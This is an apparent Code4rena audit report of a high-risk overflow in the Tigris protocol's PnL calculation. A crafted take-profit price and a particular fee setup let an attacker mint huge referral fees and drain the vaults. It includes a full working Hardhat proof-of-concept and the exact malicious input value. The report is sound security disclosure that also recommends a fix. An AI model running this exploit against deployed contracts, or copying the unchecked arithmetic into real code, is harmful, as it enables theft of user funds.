## Tags

- bug
- 3 (High Risk)
- selected for report
- sponsor confirmed
- H-03

# [Certain fee configuration enables vaults to be drained](https://github.com/code-423n4/2022-12-tigris-findings/issues/86) 

# Lines of code

https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/utils/TradingLibrary.sol#L46


# Vulnerability details

# Certain fee configuration enables vaults to be drained

### Summary
An overflow in `TradingLibrary.pnl()` enables all funds from the vault contracts to be drained given a certain fee configuration is present.


### Detailed exploit process description
When opening a position, any value can be passed as take-profit price. This value is later used in the PNL calculation in an `unchecked` block. Setting this value specifically to attack the vault leads to the `Trading` contract minting a huge (in the example below `10^36`) Tigris tokens, which can then be given to the vault to withdraw assets.

The exploiter starts by setting himself as referrer, in order to later receive the referrer fees. 
The next step is to open a short position at the current market price by calling `initiateLimitOrder()`. Here, the malicious value which will later bring the arithmetic to overflow is passed in as take-profit price. For the example below, the value has been calculated by hand to be `115792089237316195423570985008687907854269984665640564039467` for this specific market price, leverage and margin. 
The order is then immediately executed through `executeLimitOrder()`.
The final step is to close the order through `limitClose()`, which will then mint over `10^36` Tigris tokens to the attacker.


### Detailed bug description
The bug takes place in `TradingLibrary.pnl()`, line 46. The function is called during the process of closing the order to calculate the payout and position size. The malicious take-profit is passed as `_currentPrice` and the order's original opening price is passed as `_price`. The take-profit has been specifically calculated so that `1e18 * _currentPrice / _price - 1e18` results in `0`, meaning `_payout = _margin` (`accInterest` is negligible for this PoC).
Line 48 then calculates the position size. Margin and leverage have been chosen so that `_initPositionSize * _currentPrice` does not overflow, resulting in a huge `_positionSize` which is returned from the function.

Later, `Trading._handleCloseFees()` is called, under the condition that `_payout > 0`, which is why the overflow had to be calculated so precisely, as to not subtract from the `_payout` but still create a large `_positionSize`. `_positionSize` is passed in to this function, and it is used to calculate DAO and referral fees. Line 805 is what requires the specific fee configuration to be present, as otherwise this line would revert. The fees have to be `daoFees = 2*referralFees` -- not exactly, but close to this relationship. Then line 792 will set the DAO fees close to zero, while the huge `referralFees` are directly minted and not included in the calculation in line 805.


### Recommended mitigation
The core issue is that the arithmetic in `TradingLibrary.pnl()` overflows. I recommend removing the `unchecked` block.



### PoC
Insert the following code as test into `test/07.Trading.js` and run it with `npx hardhat test test/07.Trading.js`:
```javascript
describe("PoC", function () {
    it.only("PoC", async function () {
      // Setup token balances and approvals
      const mockDAI = await ethers.getContractAt("MockERC20", MockDAI.address)
      await mockDAI.connect(owner).transfer(user.address, parseEther("10000"))
      await mockDAI.connect(user).approve(trading.address, parseEther("10000"))
      const permitData = [
        "0",
        "0",
        "0",
        "0x0000000000000000000000000000000000000000000000000000000000000000",
        "0x0000000000000000000000000000000000000000000000000000000000000000",
        false
      ]

      // Create referral code
      await referrals.connect(user).createReferralCode(ethers.constants.HashZero)

      // Set the fees
      await trading.connect(owner).setFees(
        false,        // close
        "200000000",  // dao  
        "0",          // burn
        "100000000",  // referral
        "0",          // bot
        "0",          // percent
      )


      // ============================================================== //
      // =================== Create the limit order =================== //
      // ============================================================== //
      const tradeInfo = [
        parseEther("1"),          // margin amount
        MockDAI.address,          // margin asset
        StableVault.address,      // stable vault
        parseEther("2"),          // leverage
        0,                        // asset id
        false,                    // direction (short)
        "115792089237316195423570985008687907854269984665640564039467",          // take profit price
        parseEther("0"),       // stop loss price
        ethers.constants.HashZero // referral (ourself)
      ];

      // Create the order
      await trading.connect(user).initiateLimitOrder(
        tradeInfo,            // trade info
        1,                    // order type (limit)
        parseEther("1000"),   // price
        permitData,           // permit
        user.address          // trader
      )


      // ============================================================== //
      // =================== Execute the limit order ================== //
      // ============================================================== //

      // Wait for some blocks to pass the delay
      await network.provider.send("evm_increaseTime", [10])
      await network.provider.send("evm_mine")

      // Create the price data
      let priceData = [
        node.address,                                   // provider
        0,                                              // asset id
        parseEther("1000"),                             // price
        10000000,                                       // spread (0.1%)
        (await ethers.provider.getBlock()).timestamp,   // timestamp
        false                                           // is closed
      ]

      // Sign the price data
      let message = ethers.utils.keccak256(
        ethers.utils.defaultAbiCoder.encode(
          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],
          [priceData[0], priceData[1], priceData[2], priceData[3], priceData[4], priceData[5]]
        )
      );
      let sig = await node.signMessage(
        Buffer.from(message.substring(2), 'hex')
      )

      // Execute the limit order
      await trading.connect(user).executeLimitOrder(1, priceData, sig);





      // ============================================================== //
      // ======================== Close order  ======================== //
      // ============================================================== //

      // Wait for some blocks to pass the delay
      await network.provider.send("evm_increaseTime", [10])
      await network.provider.send("evm_mine")

      // Close order
      await trading.connect(user).limitClose(
        1,          // id
        true,       // take profit
        priceData,  // price data
        sig,        // signature
      )

      // Print results
      const amount = await stabletoken.balanceOf(user.address)
      const tenPow18 = "1000000000000000000"
      console.log(`StableToken balance at end: ${(amount / tenPow18).toString()}`)
    })
})
```